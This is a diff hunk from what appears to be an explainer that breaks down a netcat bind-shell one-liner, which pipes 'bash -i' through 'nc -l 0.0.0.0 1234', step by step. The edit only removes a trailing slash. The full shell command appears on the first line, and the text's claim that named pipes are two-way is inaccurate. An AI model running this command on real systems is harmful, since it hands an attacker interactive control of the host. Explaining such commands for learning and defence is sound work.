@@ -1,6 +1,6 @@
 > rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1234 > /tmp/f
 
-rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
+rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f This ensures that the script can create a new named pipe without conflicts.
 mkfifo /tmp/f - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
 cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
 | bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.
